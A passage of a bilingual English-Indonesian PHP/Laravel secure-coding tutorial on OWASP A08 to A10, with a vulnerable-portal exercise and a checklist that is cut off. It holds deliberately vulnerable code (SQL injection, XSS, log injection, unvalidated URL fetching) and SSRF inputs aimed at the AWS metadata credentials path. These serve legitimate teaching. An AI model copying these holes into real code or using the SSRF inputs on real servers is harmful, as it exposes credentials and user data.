$ openssl dgst -sha256 -sign private_key.pem -out tool.phar.sig tool.phar

# Verify on download
$ openssl dgst -sha256 -verify public_key.pem -signature tool.phar.sig tool.phar
```

</section>

<section lang="id">

## A08: Kegagalan Integritas Perangkat Lunak dan Data

Risiko ini mencakup kegagalan memverifikasi integritas pembaruan perangkat lunak, data penting, dan pipeline CI/CD. Dalam ekosistem PHP, perhatian utama adalah **kerancuan dependensi (dependency confusion)** dan **deserialisasi tidak terpercaya** (dibahas di A04).

### Kerancuan Dependensi Composer

Kerancuan dependensi terjadi ketika penyerang mempublikasikan paket dengan nama yang sama dengan paket internal Anda ke Packagist. Jika `composer.json` Anda mereferensikan paket privat tanpa secara eksplisit mengonfigurasi repositori privat, Composer mungkin menarik paket publik (berbahaya) tersebut.

**Pencegahan:**

```json
{
    "repositories": [
        {
            "type": "composer",
            "url": "https://composer.se.polinema.ac.id"
        }
    ],
    "config": {
        "secure-http": true,
        "github-protocols": ["https"],
        "allow-plugins": {
            "php-http/discovery": false
        }
    }
}
```

- Selalu gunakan `https` untuk repositori Composer
- Atur `secure-http: true` untuk memblokir unduhan tidak terenkripsi
- Daftarkan plugin yang diizinkan secara eksplisit — tolak yang lainnya
- Menggunakan Packagist privat (misalnya, Private Packagist, Satis) untuk paket internal mencegah tabrakan nama dengan paket publik

### Integritas File Lock Composer

File `composer.lock` mencatat versi tepat dan hash konten dari setiap paket yang diinstal:

```bash
# Jangan pernah menghapus composer.lock — ini adalah catatan integritas Anda
# Selalu commit ke version control

$ composer install --no-dev --optimize-autoloader
# Di production: gunakan composer install (bukan update) untuk menghormati file lock
```

Jika penyerang memodifikasi paket antara `composer update` terakhir Anda dan deployment, `composer install` akan mendeteksi ketidakcocokan hash dan gagal. Ini adalah penjaga integritas Anda.

### Keamanan Pipeline CI/CD

Pipeline CI/CD memiliki akses ke secrets (kunci deploy, token API). Pipeline yang dikompromikan dapat menyuntikkan backdoor ke setiap build.

| Risiko | Mitigasi |
|---|---|
| **PR yang tidak direview memicu deploy** | Mewajibkan persetujuan untuk workflow yang dipicu oleh `pull_request_target` |
| **Secrets di log build** | Jangan pernah `echo` secrets; gunakan masked environment variables |
| **GitHub Actions pihak ketiga** | Pin actions ke SHA commit lengkap, bukan tag atau branch |
| **Script injection via judul/isi PR** | Sanitasi input yang dikontrol pengguna yang digunakan dalam perintah shell di workflow |

Contoh pinning action yang aman:

```yaml
# AMAN: Dipin ke SHA commit tepat — immutable
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2

# BERBAHAYA: Referensi branch dapat diubah oleh pemilik repo, menyuntikkan kode berbahaya
- uses: actions/checkout@main
```

### Penandatanganan Artifact

Untuk distribusi alat internal (alat riset, framework SE Lab), tandatangani paket Anda:

```bash
# Tandatangani arsip Phar
$ openssl dgst -sha256 -sign private_key.pem -out tool.phar.sig tool.phar

# Verifikasi saat mengunduh
$ openssl dgst -sha256 -verify public_key.pem -signature tool.phar.sig tool.phar
```

</section>

---

<section lang="en">

## A09: Security Logging and Monitoring Failures

Without adequate logging and monitoring, breaches go undetected for months. The average time to detect a breach is **194 days** (IBM, 2025). Security logging is not just about compliance—it is your breach detection system.

### What to Log

| Event | What to Record | Why |
|---|---|---|
| **Authentication attempts** | User ID, IP, timestamp, success/failure, failure reason | Detect brute-force attacks and credential stuffing |
| **Authorisation failures** | User ID, IP, requested resource, required permission | Identify access-control bypass attempts |
| **Input validation failures** | Endpoint, input fields, submitted values (truncated), IP | Detect injection and fuzzing attacks |
| **Rate limit triggers** | IP, endpoint, current rate, limit | Early warning of DoS attempts |
| **Sensitive data access** | User ID, record ID, operation (view/edit/delete/export) | Detect insider threats and excessive data access |
| **Configuration changes** | Setting name, old value, new value, changed by | Detect backdoor configuration (e.g., disabling MFA) |

### Secure Logging Implementation

**Vulnerable Code (Log Injection):**

```php
<?php

// DANGEROUS: Unvalidated user input written directly to log
$username = $_POST['username'];
error_log("Login attempt for user: {$username}");
```

An attacker provides `username=admin\n[2026-07-10 10:00:00] ALERT: Security breach detected` as the username. The log now contains a forged entry that looks like a legitimate alert.

**Secure Code:**

```php
<?php

declare(strict_types=1);

class SecureLogger
{
    public function __construct(
        private readonly \Psr\Log\LoggerInterface $logger,
    ) {}

    public function logAuthenticationAttempt(
        ?string $userId,
        string $email,
        bool $success,
        string $ipAddress,
    ): void {
        // Sanitise: strip newlines and control characters from user-supplied data
        $safeEmail = preg_replace('/[\x00-\x1F\x7F]/u', '', $email);

        $this->logger->info('Authentication attempt', [
            'user_id'      => $userId ?? 'null',
            'email'        => hash('sha256', strtolower($safeEmail)), // Hash PII for privacy
            'success'      => $success,
            'ip_address'   => $ipAddress,
            'user_agent'   => substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 200),
            'timestamp'    => (new \DateTimeImmutable())->format('c'),
        ]);
    }
}
```

Notice that we:
- Strip control characters from user input to prevent log injection
- Hash the email address to protect personally identifiable information (PII) in logs
- Use structured logging (JSON context) rather than string interpolation
- Truncate the user agent to prevent log flooding

### Laravel Logging Configuration

In `config/logging.php`:

```php
return [
    'channels' => [
        'security' => [
            'driver'   => 'daily',
            'path'     => storage_path('logs/security.log'),
            'level'    => env('LOG_LEVEL', 'debug'),
            'days'     => 90, // Retain for compliance
            'permission' => 0600, // Only owner can read/write
        ],

        'stack' => [
            'driver'   => 'stack',
            'channels' => ['single', 'security'],
            'ignore_exceptions' => false,
        ],
    ],
];
```

The `security` channel keeps a separate, longer-retention log with restricted file permissions. Stack it with your main application log so you never miss security events.

### Monitoring and Alerting

Logs are useless if nobody reads them. Implement automated alerting:

```php
<?php

declare(strict_types=1);

class SecurityMonitor
{
    public function __construct(
        private readonly \PDO $pdo,
    ) {}

    public function detectBruteForce(string $email, string $ipAddress): bool
    {
        $stmt = $this->pdo->prepare(
            'SELECT COUNT(*) AS cnt
             FROM audit_log
             WHERE action = :action
             AND JSON_EXTRACT(context, "$.email") = :email
             AND created_at > :since'
        );
        $stmt->execute([
            'action' => 'auth.failed',
            'email'  => hash('sha256', strtolower($email)),
            'since'  => (new \DateTimeImmutable('-15 minutes'))->format('Y-m-d H:i:s'),
        ]);

        $row = $stmt->fetch(\PDO::FETCH_ASSOC);

        if ((int) $row['cnt'] >= 10) {
            // Send alert via email, Slack, or webhook
            $this->sendAlert('Brute-force attack detected', [
                'email'      => substr($email, 0, 3) . '***',
                'ip'         => $ipAddress,
                'attempts'   => $row['cnt'],
                'window'     => '15 minutes',
            ]);

            return true;
        }

        return false;
    }
}
```

</section>

<section lang="id">

## A09: Kegagalan Pencatatan dan Pemantauan Keamanan

Tanpa pencatatan dan pemantauan yang memadai, pelanggaran tidak terdeteksi selama berbulan-bulan. Waktu rata-rata untuk mendeteksi pelanggaran adalah **194 hari** (IBM, 2025). Pencatatan keamanan bukan hanya tentang kepatuhan—ini adalah sistem deteksi pelanggaran Anda.

### Yang Harus Dicatat

| Peristiwa | Yang Harus Direkam | Mengapa |
|---|---|---|
| **Percobaan autentikasi** | ID pengguna, IP, timestamp, sukses/gagal, alasan kegagalan | Mendeteksi serangan brute-force dan credential stuffing |
| **Kegagalan otorisasi** | ID pengguna, IP, resource yang diminta, izin yang diperlukan | Mengidentifikasi upaya bypass kontrol akses |
| **Kegagalan validasi input** | Endpoint, field input, nilai yang dikirim (dipotong), IP | Mendeteksi serangan injeksi dan fuzzing |
| **Pemicu rate limit** | IP, endpoint, rate saat ini, batas | Peringatan dini upaya DoS |
| **Akses data sensitif** | ID pengguna, ID catatan, operasi (lihat/edit/hapus/ekspor) | Mendeteksi ancaman orang dalam dan akses data berlebihan |
| **Perubahan konfigurasi** | Nama pengaturan, nilai lama, nilai baru, diubah oleh | Mendeteksi konfigurasi backdoor (misalnya, menonaktifkan MFA) |

### Implementasi Pencatatan Aman

**Kode Rentan (Log Injection):**

```php
<?php

// BERBAHAYA: Input pengguna tidak divalidasi ditulis langsung ke log
$username = $_POST['username'];
error_log("Percobaan login untuk pengguna: {$username}");
```

Penyerang memberikan `username=admin\n[2026-07-10 10:00:00] PERINGATAN: Pelanggaran keamanan terdeteksi` sebagai username. Log sekarang berisi entri palsu yang terlihat seperti peringatan sah.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

class SecureLogger
{
    public function __construct(
        private readonly \Psr\Log\LoggerInterface $logger,
    ) {}

    public function logAuthenticationAttempt(
        ?string $userId,
        string $email,
        bool $success,
        string $ipAddress,
    ): void {
        // Sanitasi: hapus newline dan karakter kontrol dari data yang disediakan pengguna
        $safeEmail = preg_replace('/[\x00-\x1F\x7F]/u', '', $email);

        $this->logger->info('Percobaan autentikasi', [
            'user_id'      => $userId ?? 'null',
            'email'        => hash('sha256', strtolower($safeEmail)), // Hash PII untuk privasi
            'success'      => $success,
            'ip_address'   => $ipAddress,
            'user_agent'   => substr($_SERVER['HTTP_USER_AGENT'] ?? 'unknown', 0, 200),
            'timestamp'    => (new \DateTimeImmutable())->format('c'),
        ]);
    }
}
```

Perhatikan bahwa kita:
- Menghapus karakter kontrol dari input pengguna untuk mencegah log injection
- Meng-hash alamat email untuk melindungi informasi identitas pribadi (PII) dalam log
- Menggunakan structured logging (konteks JSON) daripada interpolasi string
- Memotong user agent untuk mencegah log flooding

### Konfigurasi Logging Laravel

Di `config/logging.php`:

```php
return [
    'channels' => [
        'security' => [
            'driver'   => 'daily',
            'path'     => storage_path('logs/security.log'),
            'level'    => env('LOG_LEVEL', 'debug'),
            'days'     => 90, // Simpan untuk kepatuhan
            'permission' => 0600, // Hanya pemilik yang dapat baca/tulis
        ],

        'stack' => [
            'driver'   => 'stack',
            'channels' => ['single', 'security'],
            'ignore_exceptions' => false,
        ],
    ],
];
```

Channel `security` menyimpan log terpisah dengan retensi lebih lama dan izin file terbatas. Tumpuk dengan log aplikasi utama Anda sehingga Anda tidak pernah melewatkan peristiwa keamanan.

### Pemantauan dan Alerting

Log tidak berguna jika tidak ada yang membacanya. Implementasikan alerting otomatis:

```php
<?php

declare(strict_types=1);

class SecurityMonitor
{
    public function __construct(
        private readonly \PDO $pdo,
    ) {}

    public function detectBruteForce(string $email, string $ipAddress): bool
    {
        $stmt = $this->pdo->prepare(
            'SELECT COUNT(*) AS cnt
             FROM audit_log
             WHERE action = :action
             AND JSON_EXTRACT(context, "$.email") = :email
             AND created_at > :since'
        );
        $stmt->execute([
            'action' => 'auth.failed',
            'email'  => hash('sha256', strtolower($email)),
            'since'  => (new \DateTimeImmutable('-15 menit'))->format('Y-m-d H:i:s'),
        ]);

        $row = $stmt->fetch(\PDO::FETCH_ASSOC);

        if ((int) $row['cnt'] >= 10) {
            // Kirim peringatan melalui email, Slack, atau webhook
            $this->sendAlert('Serangan brute-force terdeteksi', [
                'email'      => substr($email, 0, 3) . '***',
                'ip'         => $ipAddress,
                'attempts'   => $row['cnt'],
                'window'     => '15 menit',
            ]);

            return true;
        }

        return false;
    }
}
```

</section>

---

<section lang="en">

## A10: Server-Side Request Forgery (SSRF)

SSRF occurs when an attacker tricks the server into making requests to unintended locations—internal networks, cloud metadata services, or third-party systems. SSRF is particularly dangerous in cloud environments where the metadata service (e.g., `http://169.254.169.254/latest/meta-data/` on AWS) exposes credentials.

### Vulnerable URL Fetching

**Vulnerable Code:**

```php
<?php

// DANGEROUS: Attacker controls the entire URL
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```

An attacker sends `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` and retrieves AWS IAM credentials. Or `?url=http://internal-admin.se.polinema.local:8080/` and scans the internal network.

**Secure Code:**

```php
<?php

declare(strict_types=1);

class SecureUrlFetcher
{
    private const BLOCKED_HOSTS = [
        '127.0.0.1',
        'localhost',
        '169.254.169.254', // AWS metadata
        'metadata.google.internal', // GCP metadata
        '0.0.0.0',
        '::1',
    ];

    private const ALLOWED_SCHEMES = ['https'];

    private const ALLOWED_DOMAINS = [
        'api.se.polinema.ac.id',
        'cdn.se.polinema.ac.id',
    ];

    public function fetch(string $url): string
    {
        $parsed = parse_url($url);

        // Only allow specific schemes
        $scheme = $parsed['scheme'] ?? '';
        if (!in_array($scheme, self::ALLOWED_SCHEMES, true)) {
            throw new \InvalidArgumentException('Only HTTPS URLs are allowed.');
        }

        // Only allow specific domains
        $host = $parsed['host'] ?? '';
        if (!in_array($host, self::ALLOWED_DOMAINS, true)) {
            throw new \InvalidArgumentException('Domain not in allowlist.');
        }

        // Resolve DNS and check for internal IPs
        $ip = gethostbyname($host);
        if (in_array($ip, self::BLOCKED_HOSTS, true)) {
            throw new \RuntimeException('Internal IP resolution blocked.');
        }

        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            throw new \RuntimeException('Private or reserved IP address blocked.');
        }

        // Use curl with redirect restrictions
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false, // Do not follow redirects blindly
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_PROTOCOLS      => CURLPROTO_HTTPS,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode !== 200) {
            throw new \RuntimeException("HTTP {$httpCode}: Request failed.");
        }

        return $response;
    }
}
```

### Laravel HTTP Client

Laravel's HTTP client (`Http` facade) does not prevent SSRF by itself, but you can configure it safely:

```php
use Illuminate\Support\Facades\Http;

// Allowlist approach: only allow specific domains
class SecureApiClient
{
    private const ALLOWED_HOSTS = [
        'api.se.polinema.ac.id',
        'cdn.se.polinema.ac.id',
    ];

    public function fetchData(string $endpoint): array
    {
        $url = 'https://api.se.polinema.ac.id/' . ltrim($endpoint, '/');

        $host = parse_url($url, PHP_URL_HOST);

        if (!in_array($host, self::ALLOWED_HOSTS, true)) {
            throw new \RuntimeException('External API calls are restricted.');
        }

        return Http::timeout(10)
            ->withOptions(['allow_redirects' => false])
            ->get($url)
            ->throw()
            ->json();
    }
}
```

### SSRF Prevention Checklist

- [ ] Never accept full URLs from users; use allowlists for domains, schemes, and ports
- [ ] Block internal IP ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`)
- [ ] Only allow HTTPS; block HTTP, FTP, file, gopher, and other schemes
- [ ] Do not follow redirects automatically—validate the redirect target before following
- [ ] Use a proxy or network-level egress firewall as a second layer of defense

</section>

<section lang="id">

## A10: Server-Side Request Forgery (SSRF)

SSRF terjadi ketika penyerang menipu server untuk membuat permintaan ke lokasi yang tidak dimaksudkan—jaringan internal, layanan metadata cloud, atau sistem pihak ketiga. SSRF sangat berbahaya di lingkungan cloud di mana layanan metadata (misalnya, `http://169.254.169.254/latest/meta-data/` di AWS) mengekspos kredensial.

### Pengambilan URL Rentan

**Kode Rentan:**

```php
<?php

// BERBAHAYA: Penyerang mengontrol seluruh URL
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
```

Penyerang mengirim `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/` dan mengambil kredensial IAM AWS. Atau `?url=http://internal-admin.se.polinema.local:8080/` dan memindai jaringan internal.

**Kode Aman:**

```php
<?php

declare(strict_types=1);

class SecureUrlFetcher
{
    private const BLOCKED_HOSTS = [
        '127.0.0.1',
        'localhost',
        '169.254.169.254', // Metadata AWS
        'metadata.google.internal', // Metadata GCP
        '0.0.0.0',
        '::1',
    ];

    private const ALLOWED_SCHEMES = ['https'];

    private const ALLOWED_DOMAINS = [
        'api.se.polinema.ac.id',
        'cdn.se.polinema.ac.id',
    ];

    public function fetch(string $url): string
    {
        $parsed = parse_url($url);

        // Hanya izinkan skema tertentu
        $scheme = $parsed['scheme'] ?? '';
        if (!in_array($scheme, self::ALLOWED_SCHEMES, true)) {
            throw new \InvalidArgumentException('Hanya URL HTTPS yang diizinkan.');
        }

        // Hanya izinkan domain tertentu
        $host = $parsed['host'] ?? '';
        if (!in_array($host, self::ALLOWED_DOMAINS, true)) {
            throw new \InvalidArgumentException('Domain tidak ada dalam daftar izin.');
        }

        // Resolusi DNS dan periksa IP internal
        $ip = gethostbyname($host);
        if (in_array($ip, self::BLOCKED_HOSTS, true)) {
            throw new \RuntimeException('Resolusi IP internal diblokir.');
        }

        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            throw new \RuntimeException('Alamat IP privat atau dicadangkan diblokir.');
        }

        // Gunakan curl dengan batasan redirect
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false, // Jangan ikuti redirect secara buta
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_PROTOCOLS      => CURLPROTO_HTTPS,
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode !== 200) {
            throw new \RuntimeException("HTTP {$httpCode}: Permintaan gagal.");
        }

        return $response;
    }
}
```

### HTTP Client Laravel

HTTP client Laravel (fasad `Http`) tidak mencegah SSRF dengan sendirinya, tetapi Anda dapat mengonfigurasinya dengan aman:

```php
use Illuminate\Support\Facades\Http;

// Pendekatan allowlist: hanya izinkan domain tertentu
class SecureApiClient
{
    private const ALLOWED_HOSTS = [
        'api.se.polinema.ac.id',
        'cdn.se.polinema.ac.id',
    ];

    public function fetchData(string $endpoint): array
    {
        $url = 'https://api.se.polinema.ac.id/' . ltrim($endpoint, '/');

        $host = parse_url($url, PHP_URL_HOST);

        if (!in_array($host, self::ALLOWED_HOSTS, true)) {
            throw new \RuntimeException('Panggilan API eksternal dibatasi.');
        }

        return Http::timeout(10)
            ->withOptions(['allow_redirects' => false])
            ->get($url)
            ->throw()
            ->json();
    }
}
```

### Checklist Pencegahan SSRF

- [ ] Jangan pernah menerima URL lengkap dari pengguna; gunakan allowlist untuk domain, skema, dan port
- [ ] Blokir rentang IP internal (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `169.254.0.0/16`)
- [ ] Hanya izinkan HTTPS; blokir HTTP, FTP, file, gopher, dan skema lainnya
- [ ] Jangan ikuti redirect secara otomatis—validasi target redirect sebelum mengikuti
- [ ] Gunakan proxy atau firewall egress tingkat jaringan sebagai lapisan pertahanan kedua

</section>

---

<section lang="en">

## Hands-On Exercise: Secure the "Vulnerable Student Portal"

Now it is your turn. Below is a deliberately vulnerable PHP snippet from a student portal. Review the code, identify every OWASP Top 10 violation, and implement secure fixes.

### The Vulnerable Portal

```php
<?php

// Vulnerable Student Portal — DO NOT DEPLOY
include 'config.php';

$id = $_GET['id'];
$query = "SELECT * FROM students WHERE id = {$id}";
$result = mysqli_query($conn, $query);
$student = mysqli_fetch_assoc($result);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newGrade = $_POST['grade'];
    $comment = $_POST['comment'];

    mysqli_query($conn,
        "UPDATE students SET grade = '{$newGrade}' WHERE id = {$id}"
    );

    echo "<div class='comment'>" . $comment . "</div>";
}

$encrypted = md5($student['ssn']);

echo "<h1>Welcome, " . $student['name'] . "</h1>";
echo "<p>Grade: " . $student['grade'] . "</p>";
echo "<p>SSN (hashed with MD5): {$encrypted}</p>";
echo "<!-- Debug: " . print_r($student, true) . " -->";
```

### Exercise Tasks

1. **Identify vulnerabilities** — Find at least 10 distinct security issues. Classify each by OWASP category.
2. **Rewrite the code** using secure PHP practices: prepared statements, output escaping, input validation, proper hashing, access control, and no debug data exposure.
3. **Add a security layer** — Add CSRF protection, a rate limiter, and an audit log entry for every grade change.
4. **Laravel migration** — If this were a Laravel application, rewrite the vulnerable code using Eloquent, Blade, Gate policies, and the `Hash` facade.

### What to Submit

For each task, provide:
- The list of vulnerabilities you found, with OWASP category and line reference
- Your secure rewrite of the vulnerable code
- Your additional security layer implementation
- Your Laravel migration code

### Expected Vulnerabilities (Minimum)

| # | Vulnerability | OWASP | Location |
|---|---|---|---|
| 1 | SQL injection via `$_GET['id']` | A03 | Lines 5–6 |
| 2 | SQL injection via `$_POST['grade']` | A03 | Line 12 |
| 3 | XSS via unsanitised `$comment` echo | A03 | Line 15 |
| 4 | XSS via unsanitised `$student['name']` echo | A03 | Line 20 |
| 5 | Broken Access Control — no ownership check | A01 | Entire file |
| 6 | Weak hashing — MD5 on SSN | A02 | Line 18 |
| 7 | Exposed `config.php` with credentials | A05 | Line 3 |
| 8 | Debug data in HTML comments | A05 | Line 23 |
| 9 | No CSRF protection on POST | A04/A01 | Line 9 |
| 10 | No rate limiting | A04 | Line 9 |
| 11 | No audit log for grade changes | A09 | Line 12 |
| 12 | MySQLi with `mysqli_query` (no prepared statements) | A03 | Lines 6, 12 |

</section>

<section lang="id">

## Latihan Langsung: Amankan "Portal Mahasiswa Rentan"

Sekarang giliran Anda. Di bawah ini adalah potongan PHP yang sengaja dibuat rentan dari portal mahasiswa. Tinjau kode, identifikasi setiap pelanggaran OWASP Top 10, dan implementasikan perbaikan aman.

### Portal Rentan

```php
<?php

// Portal Mahasiswa Rentan — JANGAN DEPLOY
include 'config.php';

$id = $_GET['id'];
$query = "SELECT * FROM students WHERE id = {$id}";
$result = mysqli_query($conn, $query);
$student = mysqli_fetch_assoc($result);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newGrade = $_POST['grade'];
    $comment = $_POST['comment'];

    mysqli_query($conn,
        "UPDATE students SET grade = '{$newGrade}' WHERE id = {$id}"
    );

    echo "<div class='comment'>" . $comment . "</div>";
}

$encrypted = md5($student['ssn']);

echo "<h1>Selamat datang, " . $student['name'] . "</h1>";
echo "<p>Nilai: " . $student['grade'] . "</p>";
echo "<p>SSN (dihash dengan MD5): {$encrypted}</p>";
echo "<!-- Debug: " . print_r($student, true) . " -->";
```

### Tugas Latihan

1. **Identifikasi kerentanan** — Temukan setidaknya 10 masalah keamanan yang berbeda. Klasifikasikan masing-masing berdasarkan kategori OWASP.
2. **Tulis ulang kode** menggunakan praktik PHP aman: prepared statements, output escaping, validasi input, hashing yang tepat, kontrol akses, dan tidak ada eksposur data debug.
3. **Tambahkan lapisan keamanan** — Tambahkan perlindungan CSRF, rate limiter, dan entri log audit untuk setiap perubahan nilai.
4. **Migrasi Laravel** — Jika ini adalah aplikasi Laravel, tulis ulang kode rentan menggunakan Eloquent, Blade, policy Gate, dan fasad `Hash`.

### Yang Harus Dikumpulkan

Untuk setiap tugas, berikan:
- Daftar kerentanan yang Anda temukan, dengan kategori OWASP dan referensi baris
- Penulisan ulang aman Anda dari kode rentan
- Implementasi lapisan keamanan tambahan Anda
- Kode migrasi Laravel Anda

### Kerentanan yang Diharapkan (Minimum)

| # | Kerentanan | OWASP | Lokasi |
|---|---|---|---|
| 1 | SQL injection via `$_GET['id']` | A03 | Baris 5–6 |
| 2 | SQL injection via `$_POST['grade']` | A03 | Baris 12 |
| 3 | XSS via `$comment` tidak disanitasi di echo | A03 | Baris 15 |
| 4 | XSS via `$student['name']` tidak disanitasi di echo | A03 | Baris 20 |
| 5 | Broken Access Control — tidak ada pemeriksaan kepemilikan | A01 | Keseluruhan file |
| 6 | Hashing lemah — MD5 pada SSN | A02 | Baris 18 |
| 7 | `config.php` terekspos dengan kredensial | A05 | Baris 3 |
| 8 | Data debug di komentar HTML | A05 | Baris 23 |
| 9 | Tidak ada perlindungan CSRF pada POST | A04/A01 | Baris 9 |
| 10 | Tidak ada rate limiting | A04 | Baris 9 |
| 11 | Tidak ada log audit untuk perubahan nilai | A09 | Baris 12 |
| 12 | MySQLi dengan `mysqli_query` (tanpa prepared statements) | A03 | Baris 6, 12 |

</section>

---

<section lang="en">

## Secure Coding Checklist for PHP / Laravel Projects

Use this checklist before submitting any SE Lab project, thesis, or course assignment. Review each item and check the box only when it is satisfied.

### Input & Output

- [ ] All database queries use prepared statements with parameter binding — never string interpolation
- [ ] All user-supplied data rendered in HTML is escaped with `htmlspecialchars()` or Blade `{{ }}`
- [ ] File uploads validate MIME type, file extension (allowlist), and file size before storage
- [ ] File uploads are stored outside the webroot or in non-executable directories
- [ ] All user-supplied data in shell commands is validated against an allowlist or escaped with `escapeshellarg()`

### Authentication & Session

- [ ] Passwords are hashed with `password_hash()` using `PASSWORD_BCRYPT` (cost >= 12)
- [ ] Password reset tokens are single-use, time-limited (15 minutes), and cryptographically random
- [ ] Session ID is regenerated after login, privilege change, and logout
- [ ] Session cookies have `HttpOnly`, `Secure`, and `SameSite=Lax` flags
- [ ] Account lockout or rate limiting is applied after 5 consecutive failed login attempts
- [ ] Multi-factor authentication is enforced for admin accounts

### Authorisation

- [ ] Every data-access endpoint verifies that the authenticated user owns or is permitted to access the resource
- [ ] Role and permission checks happen on the server — never trust client-side UI to enforce access control
- [ ] Administrative endpoints are behind role-checking middleware
- [ ] In Laravel, use policies and gates for authorisation; call `$this->authorize()` in every controller action

### Data Protection

- [ ] Sensitive data at rest is encrypted using AES-256 (Laravel's `Crypt` facade or equivalent)
- [ ] Personally identifiable information (PII) in logs is hashed or pseudonymised
- [ ] Database backups are encrypted and access-restricted
- [ ] API keys, database passwords, and other secrets are stored in environment variables — never in source code

### Configuration

- [ ] `APP_DEBUG` is `false` and `APP_ENV` is `production` in production
- [ ] `display_errors` is `Off`; errors are logged, not displayed
- [ ] Security headers are set: `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`
- [ ] CORS configuration restricts `allowed_origins` to explicit domains — no `*` with credentials
- [ ] `.env` is excluded from version control and inaccessible via the web server

### Dependencies

- [ ] PHP version is actively supported (8.2+ as of 2026)
- [ ] `composer audit` returns zero known vulnerabilities
- [ ] All Composer and npm packages are pinned to exact versions in lock files
- [ ] Dependabot or equivalent is configured for automated vulnerability alerts

### Logging & Monitoring

- [ ] Authentication attempts (success and failure) are logged
- [ ] Authorisation failures are logged
- [ ] Suspicious patterns (rapid-fire requests, unusual access times) trigger alerts
- [ ] Logs do not contain passwords, tokens, or unredacted PII
- [ ] Log files have restrictive permissions (0600) and are rotated regularly

### CI/CD & Deployment

- [ ] GitHub Actions or other CI/CD workflows pin actions to full commit SHAs
- [ ] Secrets are injected via environment or secrets manager — never in workflow files
- [ ] Production deployments use `composer install --no-dev --optimize-autoloader`
- [ ] Automated tests include security regression tests for critical flows (auth, authorisation, data access)

</section>

<section lang="id">

## Checklist Secure Coding untuk Proyek PHP / Laravel

Gunakan checklist ini sebelum mengirimkan proyek SE Lab, tesis, atau tugas mata kuliah apa pun. Tinjau setiap item dan centang kotak hanya ketika terpenuhi.

### Input & Output

- [ ] Semua query database menggunakan prepared statements dengan parameter binding — tidak pernah interpolasi string
- [ ] Semua data yang disediakan pengguna yang dirender dalam HTML di-escape dengan `htmlspecialchars()` atau Blade `{{ }}`
- [ ] Upload file memvalidasi tipe MIME, ekstensi file (allowlist), dan ukuran file sebelum penyimpanan
- [ ] Upload file disimpan di luar webroot atau di direktori non-executable
- [ ] Semua data yang disediakan pengguna dalam perintah shell divalidasi terhadap allowlist atau di-escape dengan `escapeshellarg()`

### Autentikasi & Sesi

- [ ] Password di-hash dengan `password_hash()` menggunakan `PASSWORD_BCRYPT` (cost >= 12)
- [ ] Token reset password bersifat sekali pakai, berbatas waktu (15 menit), dan acak secara kriptografis
- [ ] ID sesi diregenerasi setelah login, perubahan hak istimewa, dan logout
- [ ] Cookie sesi memiliki flag `HttpOnly`, `Secure`, dan `SameSite=Lax`
- [ ] Penguncian akun atau rate limiting diterapkan setelah 5 percobaan login gagal berturut-turut
- [ ] Autentikasi multi-faktor diterapkan untuk akun admin

### Otorisasi

- [ ] Setiap endpoint akses data memverifikasi bahwa pengguna terautentikasi memiliki atau diizinkan mengakses resource
- [ ] Pemeriksaan peran dan izin terjadi di server — jangan pernah percaya UI sisi klien untuk menegakkan kontrol akses
- [ ] Endpoint administratif berada di belakang middleware pemeriksaan peran
- [ ] Di Laravel, gunakan policies dan gates untuk otorisasi; panggil `$this->authorize()` di setiap aksi controller

### Perlindungan Data

- [ ] Data sensitif saat disimpan dienkripsi menggunakan AES-256 (fasad `Crypt` Laravel atau setara)
- [ ] Informasi identitas pribadi (PII) dalam log di-hash atau dipseudonimkan
- [ ] Backup database dienkripsi dan dibatasi aksesnya
- [ ] Kunci API, password database, dan secrets lainnya disimpan dalam variabel environment — tidak pernah dalam kode sumber

### Konfigurasi

- [ ] `APP_DEBUG` adalah `false` dan `APP_ENV` adalah `production` di production
- [ ] `display_errors` adalah `Off`; error dicatat, tidak ditampilkan
- [ ] Header keamanan disetel: `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, `Referrer-Policy`
- [ ] Konfigurasi CORS membatasi `allowed_origins` ke domain eksplisit — tidak ada `*` dengan credentials
- [ ] `.env` dikecualikan dari version control dan tidak dapat diakses melalui server web

### Dependensi

- [ ] Versi PHP didukung secara aktif (8.2+ per 2026)
- [ ] `composer audit` mengembalikan nol kerentanan yang diketahui
- [ ] Semua paket Composer dan npm dipin ke versi tepat di file lock
- [ ] Dependabot atau setara dikonfigurasi untuk peringatan kerentanan otomatis

### Pencatatan & Pemantauan

- [ ] Percobaan autentikasi (berhasil dan gagal) dicatat
- [ ] Kegagalan otorisasi dicatat
- [ ] Pola mencurigakan (permintaan cepat, waktu akses tidak biasa) memicu peringatan
- [ ] Log tidak mengandung password, token, atau PII yang tidak direduksi
- [ ] File log memiliki izin restriktif (0600) dan dirotasi secara teratur

### CI/CD & Deployment

